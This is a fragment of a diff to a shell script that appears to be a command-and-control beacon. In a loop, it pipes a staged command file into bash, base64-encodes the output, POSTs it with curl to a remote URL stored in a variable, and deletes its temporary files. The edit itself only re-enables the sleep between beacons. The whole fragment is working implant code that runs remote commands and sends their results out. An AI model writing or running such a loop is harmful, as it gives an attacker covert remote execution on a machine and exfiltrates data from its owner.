@@ -28,7 +28,7 @@ do
 
     cat /tmp/tmps|bash >> /tmp/result
     base64 /tmp/result > /tmp/enc-result 
-    # sleep $n
+    sleep $n
     curl -X POST --data "@/tmp/enc-result" $resultl
     rm /tmp/result
     rm /tmp/tmp
